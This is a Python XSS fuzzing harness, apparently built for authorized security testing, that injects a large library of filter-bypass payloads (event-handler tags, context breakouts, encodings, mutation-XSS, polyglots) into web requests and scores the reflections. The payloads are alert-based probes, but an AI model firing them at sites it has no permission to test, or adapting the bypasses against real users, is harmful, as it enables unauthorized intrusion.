#!/usr/bin/env python3
"""
XSS Reflection & Bypass Tester

Single-file harness for probing reflected XSS, content-type sniffing, and
input-filter bypass conditions on web endpoints. Built for authorized
internal security testing.

Workflow:
  1. Capture a baseline request from the target (Burp, browser devtools, curl -v).
  2. Mark each value you want fuzzed with the literal token §INJECT§
     (Burp-style). It may appear in the URL, any header value, or the body.
  3. Run this script. It substitutes a battery of payloads, sends each variant
     under multiple Accept headers, and analyzes responses for reflection,
     weak content-type handling, missing security headers, and the rendering
     context of the reflected token.
  4. Read the console summary and the JSON report.

Usage:
  # from a raw HTTP request file (paste a Burp Repeater request, mark §INJECT§)
  python xss_bypass_tester.py --raw req.txt --output report.json

  # inline args
  python xss_bypass_tester.py \\
      -u "https://target/api/x" \\
      -X POST \\
      -H "Cookie: token=§INJECT§" \\
      -H "Content-Type: application/json" \\
      -b '{"comment":null}' \\
      --output report.json

  # dry run — print what would be sent without firing
  python xss_bypass_tester.py --raw req.txt --dry-run

  # limit to specific payload categories
  python xss_bypass_tester.py --raw req.txt --categories attr_breakout polyglot

Authorized testing only. Do not use against systems you do not own or do not
have written permission to test.
"""

from __future__ import annotations

import argparse
import base64
import html
import json
import re
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from pathlib import Path
from typing import Any

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    print("Install dependencies: pip install requests", file=sys.stderr)
    sys.exit(1)


# ----------------------------------------------------------------------------
# Configuration
# ----------------------------------------------------------------------------

INJECT_MARKER = "§INJECT§"  # §INJECT§

# Embedded inside every payload so we can detect reflection independent of the
# payload's outer punctuation (which the app may rewrite).
REFLECT_TOKEN = "Zq8K3xRq"

ACCEPT_VARIANTS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html",
    "application/json, text/plain, */*",
    "*/*",
    "text/plain",
    "application/xml",
]

DEFAULT_TIMEOUT = 15
DEFAULT_RATE_LIMIT = 0.5
DEFAULT_WORKERS = 1


# ----------------------------------------------------------------------------
# Payload library
#
# Every payload embeds REFLECT_TOKEN so the analyzer can find reflections even
# when the surrounding punctuation is filtered or rewritten.
# ----------------------------------------------------------------------------

def _t() -> str:
    return REFLECT_TOKEN


PAYLOADS: dict[str, list[str]] = {
    "html_tag_basic": [
        f"<script>alert('{_t()}')</script>",
        f"<script>alert(\"{_t()}\")</script>",
        f"<svg onload=alert('{_t()}')>",
        f"<svg/onload=alert('{_t()}')>",
        f"<img src=x onerror=alert('{_t()}')>",
        f"<img src=x onerror=\"alert('{_t()}')\">",
        f"<iframe src=javascript:alert('{_t()}')>",
        f"<iframe srcdoc=\"<script>alert('{_t()}')</script>\">",
        f"<body onload=alert('{_t()}')>",
        f"<details open ontoggle=alert('{_t()}')>",
        f"<marquee onstart=alert('{_t()}')>x</marquee>",
        f"<video><source onerror=alert('{_t()}')>",
        f"<audio src=x onerror=alert('{_t()}')>",
        f"<input autofocus onfocus=alert('{_t()}')>",
        f"<select autofocus onfocus=alert('{_t()}')><option>x</option></select>",
        f"<textarea autofocus onfocus=alert('{_t()}')>",
        f"<keygen autofocus onfocus=alert('{_t()}')>",
        f"<a href=\"javascript:alert('{_t()}')\">x</a>",
        f"<object data=\"javascript:alert('{_t()}')\">",
        f"<embed src=\"javascript:alert('{_t()}')\">",
        f"<form action=\"javascript:alert('{_t()}')\"><input type=submit>",
        (
            "<math><mtext><table><mglyph><svg><mtext><textarea><a title=\""
            f"</textarea><img src onerror=alert('{_t()}')>\">"
        ),
    ],
    "attr_breakout": [
        f"\"><script>alert('{_t()}')</script>",
        f"'><script>alert('{_t()}')</script>",
        f"\"><img src=x onerror=alert('{_t()}')>",
        f"\"><svg onload=alert('{_t()}')>",
        f"\" autofocus onfocus=alert('{_t()}') x=\"",
        f"' autofocus onfocus=alert('{_t()}') x='",
        f"\" onmouseover=alert('{_t()}') x=\"",
        f"javascript:alert('{_t()}')",
        f"\"><iframe srcdoc=\"<script>alert('{_t()}')</script>\">",
        f"\"></title><script>alert('{_t()}')</script>",
        f"\"></textarea><script>alert('{_t()}')</script>",
    ],
    "js_context_breakout": [
        f"';alert('{_t()}');//",
        f"\";alert('{_t()}');//",
        f"</script><script>alert('{_t()}')</script>",
        f"`;alert('{_t()}');//",
        f"`-alert('{_t()}')-`",
        f"${{alert('{_t()}')}}",
        f"#{{alert('{_t()}')}}",
        f"-alert('{_t()}')-",
        f"*/alert('{_t()}')/*",
        f"\\';alert('{_t()}');//",
    ],
    "case_variation": [
        f"<ScRiPt>alert('{_t()}')</ScRiPt>",
        f"<SCRIPT>alert('{_t()}')</SCRIPT>",
        f"<IMG SrC=x OnErRoR=alert('{_t()}')>",
        f"<SvG OnLoAd=alert('{_t()}')>",
        f"<Script>alert('{_t()}')</Script>",
    ],
    "url_encoded": [
        urllib.parse.quote(f"<script>alert('{_t()}')</script>"),
        urllib.parse.quote(urllib.parse.quote(f"<script>alert('{_t()}')</script>")),
        urllib.parse.quote(f"<svg onload=alert('{_t()}')>"),
        urllib.parse.quote(f"<img src=x onerror=alert('{_t()}')>"),
        # Mixed: tag only encoded
        f"%3Cscript%3Ealert('{_t()}')%3C/script%3E",
        f"%3cscript%3ealert('{_t()}')%3c/script%3e",
    ],
    "html_entity": [
        f"&lt;script&gt;alert('{_t()}')&lt;/script&gt;",
        f"&#60;script&#62;alert('{_t()}')&#60;/script&#62;",
        f"&#x3c;script&#x3e;alert('{_t()}')&#x3c;/script&#x3e;",
        f"&#X3C;script&#X3E;alert('{_t()}')&#X3C;/script&#X3E;",
        f"&lt;img src=x onerror=alert('{_t()}')&gt;",
        # Long-form numeric (no semicolon — some parsers still accept)
        f"&#0000060;script&#0000062;alert('{_t()}')&#0000060;/script&#0000062;",
    ],
    "unicode_escape": [
        f"\\u003cscript\\u003ealert('{_t()}')\\u003c/script\\u003e",
        f"\\x3cscript\\x3ealert('{_t()}')\\x3c/script\\x3e",
        # Real unicode chars (some sanitizers normalize, some don't)
        f"<script>alert('{_t()}')</script>",
    ],
    "whitespace_evasion": [
        f"<script\t>alert('{_t()}')</script>",
        f"<script\n>alert('{_t()}')</script>",
        f"<script\r>alert('{_t()}')</script>",
        f"<script/x>alert('{_t()}')</script>",
        f"<img\tsrc=x\tonerror=alert('{_t()}')>",
        f"<svg‌onload=alert('{_t()}')>",  # ZWNJ
        f"<svg/onload=alert('{_t()}')//",
        f"<img src=x onerror= alert('{_t()}') >",
    ],
    "nested_filter_bypass": [
        # Defeat naive single-pass strip-tag filters
        f"<scr<script>ipt>alert('{_t()}')</scr</script>ipt>",
        f"<<script>alert('{_t()}')//<</script>",
        f"<scrip<script>t>alert('{_t()}')</scrip</script>t>",
        f"<img src=x oneonerrorrror=alert('{_t()}')>",
        f"<img src=\"x\" onerror=\"alert('{_t()}')\"<!--",
    ],
    "no_paren": [
        f"<script>onerror=alert;throw'{_t()}'</script>",
        f"<svg onload=alert`{_t()}`>",
        f"<svg><script>alert&#40;'{_t()}'&#41;</script>",
        f"<script>{{onerror=alert}}throw'{_t()}'</script>",
    ],
    "data_uri": [
        f"data:text/html,<script>alert('{_t()}')</script>",
        (
            "data:text/html;base64,"
            + base64.b64encode(f"<script>alert('{_t()}')</script>".encode()).decode()
        ),
        f"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload=alert('{_t()}')/>",
    ],
    "mutation_xss": [
        # mXSS — payload that's inert as parsed text but becomes live when
        # the application re-serializes via innerHTML.
        f"<noscript><p title=\"</noscript><img src=x onerror=alert('{_t()}')>\">",
        f"<listing>&lt;img src=x onerror=alert('{_t()}')&gt;</listing>",
        f"<noembed>&lt;img src=x onerror=alert('{_t()}')&gt;</noembed>",
        f"<style><img src=x onerror=alert('{_t()}')></style>",
        f"<template><img src=x onerror=alert('{_t()}')></template>",
    ],
    "polyglot": [
        # Ortiz' classic polyglot — works across many contexts.
        (
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('" + _t() + "') )"
            "//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>"
            "\\x3csVg/<sVg/oNloAd=alert('" + _t() + "')//>\\x3e"
        ),
        f"\";alert('{_t()}');//<svg onload=alert('{_t()}')>--></script><svg onload=alert('{_t()}')>",
        f"'\"--></style></script><svg onload=alert('{_t()}')>",
    ],
    "css_context": [
        f"</style><script>alert('{_t()}')</script>",
        f"expression(alert('{_t()}'))",
        f"x:expression(alert('{_t()}'))",
        f"</style><svg onload=alert('{_t()}')>",
    ],
    "null_byte": [
        f"<script>alert('{_t()}')</script>\x00",
        f"<scri\x00pt>alert('{_t()}')</scri\x00pt>",
        f"<img src=x\x00onerror=alert('{_t()}')>",
    ],
    "control_char": [
        f"<img src=x onerror\x09=alert('{_t()}')>",
        f"<img src=x onerror\x0a=alert('{_t()}')>",
        f"<img src=x onerror\x0c=alert('{_t()}')>",
        f"<img src=x onerror\x0d=alert('{_t()}')>",
    ],
    "double_encoded": [
        # The token alone, URL-double-encoded — flags WAFs that decode once
        # then forward decoded payloads to the backend.
        urllib.parse.quote(urllib.parse.quote(f"<svg onload=alert('{_t()}')>")),
        urllib.parse.quote(urllib.parse.quote(f"<img src=x onerror=alert('{_t()}')>")),
    ],
    "passive_marker": [
        # Inert reflection probe — the token by itself. Use to confirm a
        # parameter is reflected before judging which active payloads fired.
        _t(),
    ],
}


# ----------------------------------------------------------------------------
# Raw request parsing (Burp Repeater format)
# ----------------------------------------------------------------------------

def parse_raw_request(
    raw: str,
    scheme: str = "https",
    host_override: str | None = None,
) -> dict[str, Any]:
    lines = raw.replace("\r\n", "\n").split("\n")
    if not lines:
        raise ValueError("Empty request")

    parts = lines[0].split(" ", 2)
    if len(parts) < 2:
        raise ValueError(f"Bad request line: {lines[0]}")
    method = parts[0].upper()
    path = parts[1]

    headers: dict[str, str] = {}
    i = 1
    while i < len(lines) and lines[i].strip():
        if ":" in lines[i]:
            k, v = lines[i].split(":", 1)
            headers[k.strip()] = v.strip()
        i += 1

    body = "\n".join(lines[i + 1:]) if i + 1 < len(lines) else ""
    body = body.rstrip("\n")

    host = host_override or headers.get("Host", "")
    if not host:
        raise ValueError("Missing Host header and no --host override")
    if path.startswith("http"):
        url = path
    else:
        url = f"{scheme}://{host}{path}"

    return {"method": method, "url": url, "headers": headers, "body": body}


# ----------------------------------------------------------------------------
# Injection
# ----------------------------------------------------------------------------

def find_injection_points(req: dict[str, Any]) -> list[tuple[str, str]]:
    points: list[tuple[str, str]] = []
    if INJECT_MARKER in req["url"]:
        points.append(("url", req["url"]))
    for k, v in req["headers"].items():
        if INJECT_MARKER in v:
            points.append((f"header:{k}", v))
    if INJECT_MARKER in req["body"]:
        points.append(("body", req["body"]))
    return points


def apply_payload(req: dict[str, Any], payload: str) -> dict[str, Any]:
    return {
        "method": req["method"],
        "url": req["url"].replace(INJECT_MARKER, payload),
        "headers": {k: v.replace(INJECT_MARKER, payload) for k, v in req["headers"].items()},
        "body": req["body"].replace(INJECT_MARKER, payload),
    }


# ----------------------------------------------------------------------------
# Response analysis
# ----------------------------------------------------------------------------

SECURITY_HEADERS = [
    "content-type",
    "content-security-policy",
    "x-content-type-options",
    "x-frame-options",
    "x-xss-protection",
    "referrer-policy",
    "strict-transport-security",
]


def classify_context(text: str, token: str) -> str:
    idx = text.find(token)
    if idx < 0:
        return "none"

    snippet = text[max(0, idx - 200):idx]

    last_script_open = snippet.rfind("<script")
    last_script_close = snippet.rfind("</script")
    if last_script_open > last_script_close:
        return "js_block"

    last_style_open = snippet.rfind("<style")
    last_style_close = snippet.rfind("</style")
    if last_style_open > last_style_close:
        return "css_block"

    last_comment_open = snippet.rfind("<!--")
    last_comment_close = snippet.rfind("-->")
    if last_comment_open > last_comment_close:
        return "html_comment"

    last_tag_open = snippet.rfind("<")
    last_tag_close = snippet.rfind(">")
    if last_tag_open > last_tag_close:
        tag_snippet = snippet[last_tag_open:]
        if "=" in tag_snippet:
            tail = tag_snippet[tag_snippet.rfind("="):]
            if "\"" in tail:
                return "html_attribute_double"
            if "'" in tail:
                return "html_attribute_single"
            return "html_attribute_unquoted"
        return "html_tag_name"

    return "html_body"


def analyze_response(resp: requests.Response, payload: str) -> dict[str, Any]:
    text = resp.text
    headers_lower = {k.lower(): v for k, v in resp.headers.items()}

    reflections: list[str] = []
    if REFLECT_TOKEN in text:
        reflections.append("literal_token")
    if html.escape(REFLECT_TOKEN) in text and html.escape(REFLECT_TOKEN) != REFLECT_TOKEN:
        reflections.append("html_escaped_token")
    if payload in text:
        reflections.append("full_payload_literal")
    if urllib.parse.quote(REFLECT_TOKEN) in text:
        reflections.append("url_encoded_token")

    surrounding: list[str] = []
    for m in re.finditer(re.escape(REFLECT_TOKEN), text):
        start = max(0, m.start() - 80)
        end = min(len(text), m.end() + 80)
        surrounding.append(text[start:end])

    context = classify_context(text, REFLECT_TOKEN)

    sec_headers = {h: headers_lower.get(h) for h in SECURITY_HEADERS}
    content_type = headers_lower.get("content-type", "<missing>")
    is_html = "text/html" in content_type.lower()
    has_nosniff = "nosniff" in headers_lower.get("x-content-type-options", "").lower()
    has_csp = bool(headers_lower.get("content-security-policy"))

    score = 0
    if reflections:
        score += 30
    if "literal_token" in reflections:
        score += 20
    if "full_payload_literal" in reflections:
        score += 30
    if is_html and reflections:
        score += 40
    if reflections and not has_csp:
        score += 10
    if reflections and not has_nosniff and content_type == "<missing>":
        score += 15
    if context in ("html_body", "html_attribute_double", "html_attribute_single",
                   "html_attribute_unquoted", "js_block"):
        score += 20

    return {
        "status": resp.status_code,
        "content_type": content_type,
        "is_html": is_html,
        "has_nosniff": has_nosniff,
        "has_csp": has_csp,
        "security_headers": sec_headers,
        "reflections": reflections,
        "surrounding": surrounding[:3],
        "context": context,
        "score": score,
        "body_length": len(text),
    }


# ----------------------------------------------------------------------------
# Test executor
# ----------------------------------------------------------------------------

@dataclass
class TestCase:
    name: str
    category: str
    payload: str
    accept: str


def build_test_cases(categories: list[str] | None = None) -> list[TestCase]:
    cases: list[TestCase] = []
    cats = categories if categories else list(PAYLOADS.keys())
    for cat in cats:
        if cat not in PAYLOADS:
            print(f"Unknown category: {cat} (skipped)", file=sys.stderr)
            continue
        for i, payload in enumerate(PAYLOADS[cat]):
            for accept in ACCEPT_VARIANTS:
                cases.append(TestCase(
                    name=f"{cat}#{i}|accept:{accept[:30]}",
                    category=cat,
                    payload=payload,
                    accept=accept,
                ))
    return cases


def make_session(verify_tls: bool = True) -> requests.Session:
    s = requests.Session()
    retry = Retry(total=2, backoff_factor=0.3, status_forcelist=[502, 503, 504])
    s.mount("http://", HTTPAdapter(max_retries=retry))
    s.mount("https://", HTTPAdapter(max_retries=retry))
    s.verify = verify_tls
    return s


def execute_one(
    session: requests.Session,
    base_req: dict[str, Any],
    case: TestCase,
    timeout: int,
    dry_run: bool,
) -> dict[str, Any]:
    req = apply_payload(base_req, case.payload)
    req["headers"]["Accept"] = case.accept

    record: dict[str, Any] = {
        "case": case.name,
        "category": case.category,
        "payload": case.payload,
        "accept": case.accept,
        "method": req["method"],
        "url": req["url"],
        "sent_headers": req["headers"],
        "sent_body": req["body"],
    }

    if dry_run:
        record["dry_run"] = True
        return record

    try:
        resp = session.request(
            method=req["method"],
            url=req["url"],
            headers=req["headers"],
            data=req["body"].encode("utf-8", errors="replace") if req["body"] else None,
            timeout=timeout,
            allow_redirects=False,
        )
        record["analysis"] = analyze_response(resp, case.payload)
    except requests.RequestException as e:
        record["error"] = str(e)

    return record


def run(
    base_req: dict[str, Any],
    cases: list[TestCase],
    workers: int,
    rate_limit: float,
    timeout: int,
    verify_tls: bool,
    dry_run: bool,
    progress: bool = True,
) -> list[dict[str, Any]]:
    session = make_session(verify_tls=verify_tls)
    results: list[dict[str, Any]] = []
    total = len(cases)

    if workers <= 1:
        for i, case in enumerate(cases, 1):
            r = execute_one(session, base_req, case, timeout, dry_run)
            results.append(r)
            if progress:
                print(f"[{i}/{total}] {case.name}", file=sys.stderr)
            if rate_limit > 0 and not dry_run:
                time.sleep(rate_limit)
    else:
        with ThreadPoolExecutor(max_workers=workers) as pool:
            futures = {
                pool.submit(execute_one, session, base_req, case, timeout, dry_run): case
                for case in cases
            }
            for i, fut in enumerate(as_completed(futures), 1):
                r = fut.result()
                results.append(r)
                if progress:
                    print(f"[{i}/{total}] {futures[fut].name}", file=sys.stderr)
                if rate_limit > 0 and not dry_run:
                    time.sleep(rate_limit / workers)

    return results


# ----------------------------------------------------------------------------
# Reporting
# ----------------------------------------------------------------------------

def summarize(results: list[dict[str, Any]]) -> dict[str, Any]:
    scored = [r for r in results if "analysis" in r]
    interesting = [r for r in scored if r["analysis"]["score"] >= 50]
    interesting.sort(key=lambda r: r["analysis"]["score"], reverse=True)

    by_category: dict[str, int] = {}
    for r in interesting:
        by_category[r["category"]] = by_category.get(r["category"], 0) + 1

    any_reflection = [r for r in scored if r["analysis"]["reflections"]]
    html_responses = [r for r in scored if r["analysis"]["is_html"]]

    return {
        "total_requests": len(results),
        "errored": sum(1 for r in results if "error" in r),
        "any_reflection_count": len(any_reflection),
        "html_response_count": len(html_responses),
        "interesting_count": len(interesting),
        "by_category": by_category,
        "top_findings": interesting[:20],
    }


def print_summary(summary: dict[str, Any]) -> None:
    line = "=" * 64
    print(f"\n{line}")
    print("XSS Bypass Test Summary")
    print(line)
    print(f"Total requests sent  : {summary['total_requests']}")
    print(f"Errored              : {summary['errored']}")
    print(f"Any reflection       : {summary['any_reflection_count']}")
    print(f"HTML responses       : {summary['html_response_count']}")
    print(f"Interesting (>=50)   : {summary['interesting_count']}")

    if summary["by_category"]:
        print("\nInteresting by category:")
        for cat, n in sorted(summary["by_category"].items(), key=lambda x: -x[1]):
            print(f"  {cat:30s} {n}")

    if summary["top_findings"]:
        print("\nTop findings:")
        for i, r in enumerate(summary["top_findings"], 1):
            a = r["analysis"]
            print(f"\n  [{i}] score={a['score']} category={r['category']}")
            print(f"      payload : {r['payload'][:100]!r}")
            print(f"      accept  : {r['accept'][:60]}")
            print(f"      status  : {a['status']}")
            print(f"      ctype   : {a['content_type']}")
            print(f"      context : {a['context']}")
            print(f"      refl    : {a['reflections']}")
            print(f"      csp     : {a['has_csp']}  nosniff: {a['has_nosniff']}")
            if a.get("surrounding"):
                print(f"      around  : {a['surrounding'][0][:160]!r}")
    else:
        print("\nNo high-score findings. Inspect the raw report for partial reflections,")
        print("error-code variations, and security-header gaps.")
    print(line + "\n")


# ----------------------------------------------------------------------------
# CLI
# ----------------------------------------------------------------------------

def build_arg_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="XSS reflection and bypass tester (authorized internal testing only)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Mark each value you want fuzzed with the literal token §INJECT§\n"
            "(section sign + INJECT + section sign) in URL, header values, or body."
        ),
    )

    g_req = p.add_argument_group("request source (pick one)")
    g_req.add_argument("--raw", type=Path, help="Path to a raw HTTP request file (Burp Repeater style).")
    g_req.add_argument("-u", "--url", help="Target URL.")

    g_inline = p.add_argument_group("inline request (used with -u)")
    g_inline.add_argument("-X", "--method", default="GET", help="HTTP method (default GET).")
    g_inline.add_argument("-H", "--header", action="append", default=[],
                          help="Header 'Name: value'. Repeat for multiple. Use the marker in any value.")
    g_inline.add_argument("-b", "--body", default="", help="Request body. May contain the marker.")

    g_raw = p.add_argument_group("raw request options")
    g_raw.add_argument("--scheme", default="https", choices=["http", "https"],
                       help="Scheme for raw requests (default https).")
    g_raw.add_argument("--host", help="Override the Host header from a raw request.")

    g_exec = p.add_argument_group("execution")
    g_exec.add_argument("--workers", type=int, default=DEFAULT_WORKERS,
                        help=f"Concurrent workers (default {DEFAULT_WORKERS}).")
    g_exec.add_argument("--rate-limit", type=float, default=DEFAULT_RATE_LIMIT,
                        help=f"Seconds between requests (default {DEFAULT_RATE_LIMIT}).")
    g_exec.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT,
                        help=f"Per-request timeout (default {DEFAULT_TIMEOUT}s).")
    g_exec.add_argument("--no-verify", action="store_true", help="Skip TLS verification.")
    g_exec.add_argument("--dry-run", action="store_true", help="Print what would be sent, fire nothing.")
    g_exec.add_argument("--categories", nargs="+",
                        help=f"Restrict to payload categories. Available: {', '.join(PAYLOADS.keys())}")
    g_exec.add_argument("--list-categories", action="store_true",
                        help="List payload categories and counts, then exit.")

    g_out = p.add_argument_group("output")
    g_out.add_argument("--output", type=Path, help="Write full JSON report to this path.")
    g_out.add_argument("--quiet", action="store_true", help="Suppress per-request progress.")

    return p


def main(argv: list[str] | None = None) -> int:
    args = build_arg_parser().parse_args(argv)

    if args.list_categories:
        print("Payload categories:")
        for cat, payloads in PAYLOADS.items():
            print(f"  {cat:30s} {len(payloads)} payloads")
        print(f"\nAccept-header variants per payload: {len(ACCEPT_VARIANTS)}")
        total = sum(len(p) for p in PAYLOADS.values()) * len(ACCEPT_VARIANTS)
        print(f"Total test cases if all categories selected: {total}")
        return 0

    if args.raw:
        raw = args.raw.read_text(encoding="utf-8", errors="replace")
        base_req = parse_raw_request(raw, scheme=args.scheme, host_override=args.host)
    elif args.url:
        headers: dict[str, str] = {}
        for h in args.header:
            if ":" not in h:
                print(f"Bad header (missing colon): {h}", file=sys.stderr)
                return 2
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()
        base_req = {
            "method": args.method.upper(),
            "url": args.url,
            "headers": headers,
            "body": args.body,
        }
    else:
        print("Provide --raw or -u/--url. See --help.", file=sys.stderr)
        return 2

    points = find_injection_points(base_req)
    if not points:
        print(
            f"No injection marker '{INJECT_MARKER}' found in URL/headers/body. "
            "Nothing to test.",
            file=sys.stderr,
        )
        return 2
    print(f"Injection points: {[p[0] for p in points]}", file=sys.stderr)

    cases = build_test_cases(args.categories)
    print(f"Test cases: {len(cases)} ({len(PAYLOADS) if not args.categories else len(args.categories)} categories x payloads x {len(ACCEPT_VARIANTS)} Accept variants)", file=sys.stderr)

    if args.dry_run:
        print("Dry-run mode — no requests will be sent.", file=sys.stderr)

    results = run(
        base_req=base_req,
        cases=cases,
        workers=args.workers,
        rate_limit=args.rate_limit,
        timeout=args.timeout,
        verify_tls=not args.no_verify,
        dry_run=args.dry_run,
        progress=not args.quiet,
    )

    summary: dict[str, Any] | None = None
    if not args.dry_run:
        summary = summarize(results)
        print_summary(summary)

    if args.output:
        out: dict[str, Any] = {
            "base_request": {
                "method": base_req["method"],
                "url": base_req["url"],
                "headers": base_req["headers"],
                "body": base_req["body"],
            },
            "results": results,
        }
        if summary is not None:
            out["summary"] = summary
        args.output.write_text(json.dumps(out, indent=2, default=str), encoding="utf-8")
        print(f"Full report written to {args.output}", file=sys.stderr)

    return 0


if __name__ == "__main__":
    sys.exit(main())
